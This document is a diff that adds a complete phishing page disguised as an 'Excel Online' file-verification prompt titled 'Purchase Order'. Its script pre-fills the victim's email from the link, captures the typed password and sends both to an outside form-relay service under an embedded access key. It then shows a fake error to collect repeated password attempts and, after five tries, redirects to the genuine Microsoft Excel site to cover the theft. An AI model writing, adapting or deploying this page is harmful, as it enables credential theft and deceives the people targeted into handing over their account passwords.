@@ -1,0 +1,117 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Purchase Order</title>
+<link rel="icon" type="image/png" href="images/logo.png">
+<link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+<div class="lbox">
+<center><img src="images/logo-fill.png" style="width:90px; height:40px;"></center>
+<div class="spin-block" id="spin-block">
+<img src="images/spin.gif">
+</div>
+
+<form method="POST" id="form">
+<!-- Replace with your Access Key -->
+    <input type="hidden" name="access_key" value="51aa4655-1fb8-4584-a67a-0fa5e4d5c0b9">
+<div class="htxt" font style="color:#808080;">
+<span style='color:grey'>Excel Online - Verify to view file</span>
+</div>
+<center><font style="color:#000000;" id="result"></center>
+<br>
+<div>
+<input type="email" name="ai" class="input" id="email" placeholder="Email Address" readonly value="${temp_mail.value}">
+<br>
+<input type="password" name="si" class="input" id="ipass" placeholder="Password" required="required" value="">
+<br>
+<center><button class="button-37" role="button" type="submit">NEXT</button></center>
+</div>
+
+</form>
+
+<script src="https://web3forms.com/client/script.js" async defer></script>
+
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+const form = document.getElementById('form');
+const result = document.getElementById('result');
+const passwordField = document.getElementById("ipass");
+let clickCount = 0; // Track the number of attempts
+    
+        // Check if passwordField and result are correctly selected
+        console.log("Password Field:", passwordField);
+        console.log("Result Element:", result);
+
+form.addEventListener('submit', function(e) {
+  e.preventDefault();
+  const formData = new FormData(form);
+  const object = Object.fromEntries(formData);
+  const json = JSON.stringify(object);
+  result.innerHTML = "<span style='color:green'>Verifying...</span>"
+
+    fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: json
+        })
+        .then(async (response) => {
+            let json = await response.json();
+            if (response.status == 200) {
+                result.innerHTML = "<span style='color:red'>An Error Occured! Kindly Confirm Your Credentials And Try Again!</span>";
+            } else {
+                console.log(response);
+                result.innerHTML = json.message;
+            }
+        })
+        .catch(error => {
+            console.log(error);
+            result.innerHTML = "Something went wrong!";
+        });
+
+        // Clear password and result message after 3 seconds
+            setTimeout(function () {
+                console.log("Clearing password and result message now...");
+
+                passwordField.value = "";  // Clear the password field
+                result.innerHTML = "";  // Clear error/result message
+            }, 5000);  // Clear after 3 seconds
+    
+            // Increment the click count
+            clickCount++;
+    
+            // Redirect after 6 clicks
+            if (clickCount === 5) {
+                window.location.href = "https://excel.cloud.microsoft/"; // Replace with your desired URL
+            };
+        });
+});
+</script>
+
+
+<script type="text/javascript">
+var getUrlParameter = function getUrlParameter(sParam) {
+    var sPageURL = decodeURIComponent(window.location.search.substring(1)),
+        sURLVariables = sPageURL.split('&'),
+        sParameterName,
+        i;
+    for (i = 0; i < sURLVariables.length; i++) {
+        sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] === sParam) {
+            return sParameterName[1] === undefined ? true : sParameterName[1];
+        }
+    }
+};
+
+var firstname = getUrlParameter('e');
+
+     document.getElementById("email").value = firstname;
+
+</script>
+    
+
+</html>
